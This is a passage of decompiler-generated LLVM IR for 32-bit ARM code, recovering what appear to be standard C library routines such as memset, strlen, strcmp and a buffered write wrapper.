  uselistorder label %dec_label_pc_13cec, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_13ca4, { 1, 0, 2 }
  uselistorder label %bb150, { 2, 1, 0 }
  uselistorder label %.thread23, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ab8, { 1, 0 }
  uselistorder label %dec_label_pc_13a6c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_139e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_139e4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_13984, { 1, 0 }
  uselistorder label %dec_label_pc_13980, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13984.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13924, { 1, 0 }
  uselistorder label %dec_label_pc_138f8, { 1, 0 }
}

define i32 @function_13de0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13de0:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13de0 = load i32, i32* @r4, align 4
  store i32 %v3_13de0, i32* %stack_var_-16, align 4
  %v6_13de0 = load i32, i32* @r5, align 4
  %v9_13de0 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_13dec = call i32 @function_13f70()
  store i32 %v0_13dec, i32* @r6, align 4
  %v0_13df4 = load i32, i32* @r5, align 4
  %v0_13df8 = load i32, i32* @r4, align 4
  %v4_13e04 = inttoptr i32 %v0_13df4 to i16*
  %v5_13e04 = call i32 @function_13e18(i32 %v0_13df8, i32 1, i32 %v0_13dec, i16* %v4_13e04)
  %v1_13e08 = load i32, i32* @r6, align 4
  %v9_13e08 = icmp eq i32 %v5_13e04, %v1_13e08
  br i1 %v9_13e08, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_13de0
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_13de0, %bb
  %v1_13e14 = phi i32 [ %v5_13e04, %dec_label_pc_13de0 ], [ -1, %bb ]
  %v2_13e10 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13e10, i32* @r4, align 4
  store i32 %v6_13de0, i32* @r5, align 4
  store i32 %v9_13de0, i32* @r6, align 4
  ret i32 %v1_13e14

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_13e18(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
dec_label_pc_13e18:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_13e18 = load i32, i32* @r6, align 4
  %v12_13e18 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_13e20 = load i16, i16* %arg4, align 2
  %v1_13e24 = and i16 %v3_13e20, 192
  %v2_13e28 = icmp eq i16 %v1_13e24, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_13e28, label %dec_label_pc_13e54, label %dec_label_pc_13e40

dec_label_pc_13e40:                               ; preds = %dec_label_pc_13e18
  %v4_13e48 = call i32 @function_18620(i16* nonnull %arg4, i32 128)
  %v2_13e4c = icmp eq i32 %v4_13e48, 0
  br i1 %v2_13e4c, label %dec_label_pc_13e54thread-pre-split, label %dec_label_pc_13eb4

dec_label_pc_13e54thread-pre-split:               ; preds = %dec_label_pc_13e40
  %v0_13e54.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_13e54

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e54thread-pre-split, %dec_label_pc_13e18
  %v0_13e64 = phi i32 [ %v0_13e54.pr, %dec_label_pc_13e54thread-pre-split ], [ %arg2, %dec_label_pc_13e18 ]
  %v2_13e54 = icmp eq i32 %v0_13e64, 0
  br i1 %v2_13e54, label %dec_label_pc_13eb4, label %bb

bb:                                               ; preds = %dec_label_pc_13e54
  %v1_13e58 = load i32, i32* @r6, align 4
  %v3_13e58 = icmp eq i32 %v1_13e58, 0
  br i1 %v3_13e58, label %dec_label_pc_13eb4, label %dec_label_pc_13e60

dec_label_pc_13e60:                               ; preds = %bb
  store i32 -1, i32* @r0, align 4
  store i32 %v0_13e64, i32* @r1, align 4
  %v0_13e68 = call i32 @function_12418()
  %v0_13e6c = load i32, i32* @r6, align 4
  %tmp9 = icmp ugt i32 %v0_13e6c, %v0_13e68
  %v0_13e94 = load i32, i32* @r5, align 4
  %v1_13e94 = inttoptr i32 %v0_13e94 to i16*
  br i1 %tmp9, label %dec_label_pc_13e94, label %dec_label_pc_13e74

dec_label_pc_13e74:                               ; preds = %dec_label_pc_13e60
  store i32 %v0_13e94, i32* %r2.global-to-local, align 4
  %v0_13e78 = load i32, i32* @r4, align 4
  %v2_13e78 = mul i32 %v0_13e78, %v0_13e6c
  %v0_13e7c = load i32, i32* @r7, align 4
  %v5_13e80 = call i32 @function_184e0(i32 %v0_13e7c, i32 %v2_13e78, i16* %v1_13e94)
  store i32 %v5_13e80, i32* @r0, align 4
  %v0_13e84 = load i32, i32* @r4, align 4
  store i32 %v0_13e84, i32* @r1, align 4
  %v0_13e88 = call i32 @function_12418()
  store i32 %v0_13e88, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13eb8

dec_label_pc_13e94:                               ; preds = %dec_label_pc_13e60
  %v2_13e94 = load i16, i16* %v1_13e94, align 2
  %v1_13e98 = or i16 %v2_13e94, 8
  store i16 %v1_13e98, i16* %v1_13e94, align 2
  %v0_13ea0 = call i32 @function_12b24()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_13eac = inttoptr i32 %v0_13ea0 to i32*
  store i32 22, i32* %v2_13eac, align 4
  %v0_13eb8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13eb8

dec_label_pc_13eb4:                               ; preds = %dec_label_pc_13e54, %dec_label_pc_13e40, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13eb8

dec_label_pc_13eb8:                               ; preds = %dec_label_pc_13e94, %dec_label_pc_13e74, %dec_label_pc_13eb4
  %v0_13eb8 = phi i32 [ %v0_13eb8.pre, %dec_label_pc_13e94 ], [ %v0_13e88, %dec_label_pc_13e74 ], [ 0, %dec_label_pc_13eb4 ]
  store i32 %v9_13e18, i32* @r6, align 4
  store i32 %v12_13e18, i32* @r7, align 4
  ret i32 %v0_13eb8

; uselistorder directives
  uselistorder i16* %v1_13e94, { 0, 2, 1 }
  uselistorder i32 %v0_13e6c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @function_184e0, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_13eb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13eb4, { 2, 0, 1 }
}

define i32 @function_13ec8(i32 %arg1) local_unnamed_addr {
dec_label_pc_13ec8:
  ret i32 %arg1
}

define i32 @function_13ed0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13ed0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_13ed4 = load i32, i32* @r2, align 4
  %v8_13ed4 = icmp eq i32 %v0_13ed4, 8
  store i1 %v8_13ed4, i1* %cpsr_z.global-to-local, align 1
  %v5_13ed8 = icmp slt i32 %v0_13ed4, 8
  br i1 %v5_13ed8, label %dec_label_pc_13f38, label %dec_label_pc_13edc

dec_label_pc_13edc:                               ; preds = %dec_label_pc_13ed0
  %v4_13edc = mul i32 %arg2, 256
  %v5_13edc = or i32 %v4_13edc, %arg2
  %v4_13ee0 = mul i32 %v5_13edc, 65536
  %v5_13ee0 = or i32 %v4_13ee0, %v5_13edc
  store i32 %v5_13ee0, i32* %r1.global-to-local, align 4
  %v1_13ee457 = urem i32 %tmp, 4
  %v2_13ee458 = icmp eq i32 %v1_13ee457, 0
  store i1 %v2_13ee458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_13ee458, label %dec_label_pc_13ef4, label %bb

bb:                                               ; preds = %dec_label_pc_13edc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_13edc ]
  %v3_13ee859 = phi i32 [ %v6_13ee8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_13edc ]
  %v4_13ee8 = inttoptr i32 %v3_13ee859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_13ee8, align 1
  %v5_13ee8 = load i32, i32* @r3, align 4
  %v6_13ee8 = add i32 %v5_13ee8, 1
  store i32 %v6_13ee8, i32* @r3, align 4
  %v0_13eec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_13ef8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_13eec.pr, label %dec_label_pc_13ef4, label %.thread

.thread:                                          ; preds = %bb
  %v2_13eec = add i32 %v0_13ef8.pr.pre, -1
  store i32 %v2_13eec, i32* @r2, align 4
  %v1_13ee4 = urem i32 %v6_13ee8, 4
  %v2_13ee4 = icmp eq i32 %v1_13ee4, 0
  store i1 %v2_13ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ee4, label %dec_label_pc_13ef4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_13ee8.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_13ee8.pre to i8
  br label %bb

dec_label_pc_13ef4:                               ; preds = %.thread, %bb, %dec_label_pc_13edc
  %v0_13f0028 = phi i32 [ %tmp, %dec_label_pc_13edc ], [ %v6_13ee8, %bb ], [ %v6_13ee8, %.thread ]
  %v0_13ef8.pr = phi i32 [ %v0_13ed4, %dec_label_pc_13edc ], [ %v0_13ef8.pr.pre, %bb ], [ %v2_13eec, %.thread ]
  %v0_13ef4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13ef4, i32* @ip, align 4
  %v8_13ef810 = icmp eq i32 %v0_13ef8.pr, 8
  store i1 %v8_13ef810, i1* %cpsr_z.global-to-local, align 1
  %v5_13efc11 = icmp slt i32 %v0_13ef8.pr, 8
  br i1 %v5_13efc11, label %dec_label_pc_13f38, label %dec_label_pc_13f00.preheader

dec_label_pc_13f00.preheader:                     ; preds = %dec_label_pc_13ef4
  %v1_13f0046 = inttoptr i32 %v0_13f0028 to i32*
  store i32 %v0_13ef4, i32* %v1_13f0046, align 4
  %v3_13f0047 = add i32 %v0_13f0028, 4
  %v4_13f0048 = inttoptr i32 %v3_13f0047 to i32*
  %v5_13f0049 = load i32, i32* @ip, align 4
  store i32 %v5_13f0049, i32* %v4_13f0048, align 4
  %v6_13f0050 = add i32 %v0_13f0028, 8
  store i32 %v6_13f0050, i32* @r3, align 4
  %v0_13f0451 = load i32, i32* @r2, align 4
  %v1_13f0452 = add i32 %v0_13f0451, -8
  store i32 %v1_13f0452, i32* @r2, align 4
  %v5_13f0c53 = icmp slt i32 %v1_13f0452, 8
  br i1 %v5_13f0c53, label %dec_label_pc_13f00.dec_label_pc_13f38.loopexit_crit_edge, label %dec_label_pc_13f10

dec_label_pc_13f10:                               ; preds = %dec_label_pc_13f00.preheader, %dec_label_pc_13ef8.dec_label_pc_13f00_crit_edge
  %v6_13f0055 = phi i32 [ %v6_13f00, %dec_label_pc_13ef8.dec_label_pc_13f00_crit_edge ], [ %v6_13f0050, %dec_label_pc_13f00.preheader ]
  %v0_13f0054 = phi i32 [ %v12_13f2c, %dec_label_pc_13ef8.dec_label_pc_13f00_crit_edge ], [ %v0_13f0028, %dec_label_pc_13f00.preheader ]
  %v1_13f10 = inttoptr i32 %v6_13f0055 to i32*
  %v2_13f10 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13f10, i32* %v1_13f10, align 4
  %v3_13f10 = add i32 %v0_13f0054, 12
  %v4_13f10 = inttoptr i32 %v3_13f10 to i32*
  %v5_13f10 = load i32, i32* @ip, align 4
  store i32 %v5_13f10, i32* %v4_13f10, align 4
  %v6_13f10 = add i32 %v0_13f0054, 16
  store i32 %v6_13f10, i32* @r3, align 4
  %v0_13f14 = load i32, i32* @r2, align 4
  %v1_13f14 = add i32 %v0_13f14, -8
  store i32 %v1_13f14, i32* @r2, align 4
  %v5_13f1c = icmp slt i32 %v1_13f14, 8
  br i1 %v5_13f1c, label %dec_label_pc_13f10.dec_label_pc_13f38.loopexit_crit_edge, label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %dec_label_pc_13f10
  %v1_13f20 = inttoptr i32 %v6_13f10 to i32*
  %v2_13f20 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13f20, i32* %v1_13f20, align 4
  %v3_13f20 = add i32 %v0_13f0054, 20
  %v4_13f20 = inttoptr i32 %v3_13f20 to i32*
  %v5_13f20 = load i32, i32* @ip, align 4
  store i32 %v5_13f20, i32* %v4_13f20, align 4
  %v6_13f20 = add i32 %v0_13f0054, 24
  store i32 %v6_13f20, i32* @r3, align 4
  %v0_13f24 = load i32, i32* @r2, align 4
  %v1_13f24 = add i32 %v0_13f24, -8
  store i32 %v1_13f24, i32* @r2, align 4
  %v5_13f2c = icmp slt i32 %v1_13f24, 8
  br i1 %v5_13f2c, label %dec_label_pc_13f20.dec_label_pc_13f38.loopexit_crit_edge, label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13f20
  %v7_13f2c = inttoptr i32 %v6_13f20 to i32*
  %v8_13f2c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_13f2c, i32* %v7_13f2c, align 4
  %v9_13f2c = add i32 %v0_13f0054, 28
  %v10_13f2c = inttoptr i32 %v9_13f2c to i32*
  %v11_13f2c = load i32, i32* @ip, align 4
  store i32 %v11_13f2c, i32* %v10_13f2c, align 4
  %v12_13f2c = add i32 %v0_13f0054, 32
  store i32 %v12_13f2c, i32* @r3, align 4
  %v6_13f30 = load i32, i32* @r2, align 4
  %v7_13f30 = add i32 %v6_13f30, -8
  store i32 %v7_13f30, i32* @r2, align 4
  %v5_13efc = icmp slt i32 %v7_13f30, 8
  br i1 %v5_13efc, label %dec_label_pc_13ef8.dec_label_pc_13f38.loopexit_crit_edge, label %dec_label_pc_13ef8.dec_label_pc_13f00_crit_edge

dec_label_pc_13ef8.dec_label_pc_13f00_crit_edge:  ; preds = %dec_label_pc_13ef8
  %v2_13f00.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13f00 = inttoptr i32 %v12_13f2c to i32*
  store i32 %v2_13f00.pre, i32* %v1_13f00, align 4
  %v3_13f00 = add i32 %v0_13f0054, 36
  %v4_13f00 = inttoptr i32 %v3_13f00 to i32*
  %v5_13f00 = load i32, i32* @ip, align 4
  store i32 %v5_13f00, i32* %v4_13f00, align 4
  %v6_13f00 = add i32 %v0_13f0054, 40
  store i32 %v6_13f00, i32* @r3, align 4
  %v0_13f04 = load i32, i32* @r2, align 4
  %v1_13f04 = add i32 %v0_13f04, -8
  store i32 %v1_13f04, i32* @r2, align 4
  %v5_13f0c = icmp slt i32 %v1_13f04, 8
  br i1 %v5_13f0c, label %dec_label_pc_13f00.dec_label_pc_13f38.loopexit_crit_edge, label %dec_label_pc_13f10

dec_label_pc_13ef8.dec_label_pc_13f38.loopexit_crit_edge: ; preds = %dec_label_pc_13ef8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13f38

dec_label_pc_13f00.dec_label_pc_13f38.loopexit_crit_edge: ; preds = %dec_label_pc_13ef8.dec_label_pc_13f00_crit_edge, %dec_label_pc_13f00.preheader
  %v1_13f04.lcssa = phi i32 [ %v1_13f0452, %dec_label_pc_13f00.preheader ], [ %v1_13f04, %dec_label_pc_13ef8.dec_label_pc_13f00_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13f38

dec_label_pc_13f10.dec_label_pc_13f38.loopexit_crit_edge: ; preds = %dec_label_pc_13f10
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13f38

dec_label_pc_13f20.dec_label_pc_13f38.loopexit_crit_edge: ; preds = %dec_label_pc_13f20
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13f38

dec_label_pc_13f38:                               ; preds = %dec_label_pc_13ef4, %dec_label_pc_13ef8.dec_label_pc_13f38.loopexit_crit_edge, %dec_label_pc_13f00.dec_label_pc_13f38.loopexit_crit_edge, %dec_label_pc_13f10.dec_label_pc_13f38.loopexit_crit_edge, %dec_label_pc_13f20.dec_label_pc_13f38.loopexit_crit_edge, %dec_label_pc_13ed0
  %v0_13f40 = phi i32 [ %v0_13ed4, %dec_label_pc_13ed0 ], [ %v1_13f24, %dec_label_pc_13f20.dec_label_pc_13f38.loopexit_crit_edge ], [ %v1_13f14, %dec_label_pc_13f10.dec_label_pc_13f38.loopexit_crit_edge ], [ %v1_13f04.lcssa, %dec_label_pc_13f00.dec_label_pc_13f38.loopexit_crit_edge ], [ %v7_13f30, %dec_label_pc_13ef8.dec_label_pc_13f38.loopexit_crit_edge ], [ %v0_13ef8.pr, %dec_label_pc_13ef4 ]
  %v2_13f38 = icmp eq i32 %v0_13f40, 0
  store i1 %v2_13f38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f38, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13f38
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13f38
  %v1_13f40 = sub i32 7, %v0_13f40
  store i32 %v1_13f40, i32* @r2, align 4
  %v3_13f44 = mul i32 %v1_13f40, 4
  %v4_13f44 = add i32 %v3_13f44, ptrtoint (i32* @global_var_13f4c.740 to i32)
  call void @__pseudo_branch(i32 %v4_13f44)
  %v0_13f4c = load i32, i32* %r1.global-to-local, align 4
  %v1_13f4c = trunc i32 %v0_13f4c to i8
  %v2_13f4c = load i32, i32* @r3, align 4
  %v3_13f4c = inttoptr i32 %v2_13f4c to i8*
  store i8 %v1_13f4c, i8* %v3_13f4c, align 1
  %v4_13f4c = load i32, i32* @r3, align 4
  %v5_13f4c = add i32 %v4_13f4c, 1
  store i32 %v5_13f4c, i32* %r3.global-to-local, align 4
  %v0_13f50 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f50 = trunc i32 %v0_13f50 to i8
  %v3_13f50 = inttoptr i32 %v5_13f4c to i8*
  store i8 %v1_13f50, i8* %v3_13f50, align 1
  %v4_13f50 = load i32, i32* %r3.global-to-local, align 4
  %v5_13f50 = add i32 %v4_13f50, 1
  store i32 %v5_13f50, i32* %r3.global-to-local, align 4
  %v0_13f54 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f54 = trunc i32 %v0_13f54 to i8
  %v3_13f54 = inttoptr i32 %v5_13f50 to i8*
  store i8 %v1_13f54, i8* %v3_13f54, align 1
  %v4_13f54 = load i32, i32* %r3.global-to-local, align 4
  %v5_13f54 = add i32 %v4_13f54, 1
  store i32 %v5_13f54, i32* %r3.global-to-local, align 4
  %v0_13f58 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f58 = trunc i32 %v0_13f58 to i8
  %v3_13f58 = inttoptr i32 %v5_13f54 to i8*
  store i8 %v1_13f58, i8* %v3_13f58, align 1
  %v4_13f58 = load i32, i32* %r3.global-to-local, align 4
  %v5_13f58 = add i32 %v4_13f58, 1
  store i32 %v5_13f58, i32* %r3.global-to-local, align 4
  %v0_13f5c = load i32, i32* %r1.global-to-local, align 4
  %v1_13f5c = trunc i32 %v0_13f5c to i8
  %v3_13f5c = inttoptr i32 %v5_13f58 to i8*
  store i8 %v1_13f5c, i8* %v3_13f5c, align 1
  %v4_13f5c = load i32, i32* %r3.global-to-local, align 4
  %v5_13f5c = add i32 %v4_13f5c, 1
  store i32 %v5_13f5c, i32* %r3.global-to-local, align 4
  %v0_13f60 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f60 = trunc i32 %v0_13f60 to i8
  %v3_13f60 = inttoptr i32 %v5_13f5c to i8*
  store i8 %v1_13f60, i8* %v3_13f60, align 1
  %v4_13f60 = load i32, i32* %r3.global-to-local, align 4
  %v5_13f60 = add i32 %v4_13f60, 1
  store i32 %v5_13f60, i32* %r3.global-to-local, align 4
  %v0_13f64 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f64 = trunc i32 %v0_13f64 to i8
  %v3_13f64 = inttoptr i32 %v5_13f60 to i8*
  store i8 %v1_13f64, i8* %v3_13f64, align 1
  %v4_13f64 = load i32, i32* %r3.global-to-local, align 4
  %v5_13f64 = add i32 %v4_13f64, 1
  store i32 %v5_13f64, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13f00, { 1, 0 }
  uselistorder i32 %v12_13f2c, { 1, 2, 0 }
  uselistorder i32 %v0_13f0054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_13ef8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_13ee8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_13edc, { 1, 0 }
  uselistorder i32 %v0_13ed4, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 12, 13, 8, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 5, 8, 7, 4, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13f38, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_13f10, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_13f70() local_unnamed_addr {
dec_label_pc_13f70:
  %v0_13f70 = load i32, i32* @r0, align 4
  %v1_13f70 = and i32 %v0_13f70, -4
  %v1_13f74 = inttoptr i32 %v1_13f70 to i32*
  %v2_13f74 = load i32, i32* %v1_13f74, align 4
  %v1_13f78 = urem i32 %v0_13f70, 4
  store i32 %v1_13f78, i32* @r3, align 4
  %v2_13f78 = icmp eq i32 %v1_13f78, 0
  %v1_13f7c = sub nsw i32 0, %v1_13f78
  br i1 %v2_13f78, label %.preheader.preheader, label %dec_label_pc_13f84

dec_label_pc_13f84:                               ; preds = %dec_label_pc_13f70
  %v1_13f84 = or i32 %v2_13f74, 255
  %v7_13f88 = icmp eq i32 %v1_13f78, 1
  br i1 %v7_13f88, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_13f84
  %v9_13f8c = or i32 %v2_13f74, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_13f84, %bb
  %v8_13f94 = phi i32 [ %v1_13f84, %dec_label_pc_13f84 ], [ %v9_13f8c, %bb ]
  %v1_13f90 = add nsw i32 %v1_13f78, -2
  store i32 %v1_13f90, i32* @r3, align 4
  %v7_13f94 = icmp eq i32 %v1_13f78, 3
  br i1 %v7_13f94, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_13f94 = or i32 %v8_13f94, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_13f70
  %v1_13fa4.ph = phi i32 [ %v2_13f74, %dec_label_pc_13f70 ], [ %v9_13f94, %bb34 ], [ %v8_13f94, %bb33 ]
  %v1_13f9838 = urem i32 %v1_13fa4.ph, 256
  %v2_13f9839 = icmp eq i32 %v1_13f9838, 0
  %v2_13f9c40 = and i32 %v1_13fa4.ph, 65280
  %v3_13f9c41 = icmp eq i32 %v2_13f9c40, 0
  %or.cond42 = or i1 %v2_13f9839, %v3_13f9c41
  %v2_13fa043 = and i32 %v1_13fa4.ph, 16711680
  %v3_13fa044 = icmp eq i32 %v2_13fa043, 0
  %or.cond3145 = or i1 %v3_13fa044, %or.cond42
  %v4_13fa446 = icmp ult i32 %v1_13fa4.ph, 16777216
  %or.cond3247 = or i1 %v4_13fa446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_13fb4, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_13fa81349 = phi i32 [ %v2_13fa814, %.thread4 ], [ %v1_13f7c, %.preheader.preheader ]
  %v1_13fac48.in = phi i32 [ %v1_13fac48, %.thread4 ], [ %v1_13f70, %.preheader.preheader ]
  %v1_13fac48 = add i32 %v1_13fac48.in, 4
  %v2_13fa814 = add i32 %v1_13fa81349, 4
  %v2_13fac = inttoptr i32 %v1_13fac48 to i32*
  %v3_13fac = load i32, i32* %v2_13fac, align 4
  %v1_13f98 = urem i32 %v3_13fac, 256
  %v2_13f98 = icmp eq i32 %v1_13f98, 0
  %v2_13f9c = and i32 %v3_13fac, 65280
  %v3_13f9c = icmp eq i32 %v2_13f9c, 0
  %or.cond = or i1 %v2_13f98, %v3_13f9c
  %v2_13fa0 = and i32 %v3_13fac, 16711680
  %v3_13fa0 = icmp eq i32 %v2_13fa0, 0
  %or.cond31 = or i1 %v3_13fa0, %or.cond
  %v4_13fa4 = icmp ult i32 %v3_13fac, 16777216
  %or.cond32 = or i1 %v4_13fa4, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_13fb4, label %.thread4

dec_label_pc_13fb4:                               ; preds = %.thread4, %.preheader.preheader
  %v1_13fa813.lcssa = phi i32 [ %v1_13f7c, %.preheader.preheader ], [ %v2_13fa814, %.thread4 ]
  %v2_13f98.lcssa = phi i1 [ %v2_13f9839, %.preheader.preheader ], [ %v2_13f98, %.thread4 ]
  %v3_13f9c.lcssa = phi i1 [ %v3_13f9c41, %.preheader.preheader ], [ %v3_13f9c, %.thread4 ]
  %v3_13fa0.lcssa = phi i1 [ %v3_13fa044, %.preheader.preheader ], [ %v3_13fa0, %.thread4 ]
  br i1 %v2_13f98.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_13fb4
  %v2_13fb8 = add i32 %v1_13fa813.lcssa, 1
  br i1 %v3_13f9c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_13fc017 = add i32 %v1_13fa813.lcssa, 2
  br i1 %v3_13fa0.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_13fc8 = add i32 %v1_13fa813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_13fb4, %bb35, %bb36, %bb37
  %v1_13fcc = phi i32 [ %v2_13fb8, %bb35 ], [ %v2_13fc017, %bb36 ], [ %v2_13fc8, %bb37 ], [ %v1_13fa813.lcssa, %dec_label_pc_13fb4 ]
  ret i32 %v1_13fcc

; uselistorder directives
  uselistorder i32 %v1_13fa813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_13fac, { 3, 2, 1, 0 }
  uselistorder i32 %v1_13fa4.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_13f78, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 2 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_13fd0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13fd0:
  %v2_13fdc = inttoptr i32 %arg2 to i8*
  %v3_13fdc = call i32 @function_198c0(i8* %v2_13fdc, i32 %arg1)
  ret i32 %v3_13fdc
}

define i32 @function_13fe0(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_13fe4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13fe0

dec_label_pc_13fe0:                               ; preds = %bb3, %bb
  %v0_13fe4 = phi i32 [ %v0_13fe4.pre, %bb ], [ %v5_13fe4, %bb3 ]
  %v0_13fe0 = phi i32 [ %tmp, %bb ], [ %v5_13fe0, %bb3 ]
  %v1_13fe0 = inttoptr i32 %v0_13fe0 to i8*
  %v2_13fe0 = load i8, i8* %v1_13fe0, align 1
  %v3_13fe0 = zext i8 %v2_13fe0 to i32
  store i32 %v3_13fe0, i32* @r2, align 4
  %v1_13fe4 = inttoptr i32 %v0_13fe4 to i8*
  %v2_13fe4 = load i8, i8* %v1_13fe4, align 1
  %v3_13fe4 = zext i8 %v2_13fe4 to i32
  %v2_13fe8 = icmp eq i8 %v2_13fe0, 0
  br i1 %v2_13fe8, label %.dec_label_pc_13ff4_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_13fe0
  %v5_13fe4 = add i32 %v0_13fe4, 1
  %v5_13fe0 = add i32 %v0_13fe0, 1
  %v10_13fec = icmp eq i8 %v2_13fe0, %v2_13fe4
  br i1 %v10_13fec, label %dec_label_pc_13fe0, label %dec_label_pc_13ff4

.dec_label_pc_13ff4_crit_edge:                    ; preds = %dec_label_pc_13fe0
  br label %dec_label_pc_13ff4

dec_label_pc_13ff4:                               ; preds = %bb3, %.dec_label_pc_13ff4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_13ff4_crit_edge ], [ %v3_13fe0, %bb3 ]
  %v2_13ff4.pre-phi = sub nsw i32 %.pn, %v3_13fe4
  ret i32 %v2_13ff4.pre-phi

; uselistorder directives
  uselistorder i32 %v0_13fe0, { 1, 0 }
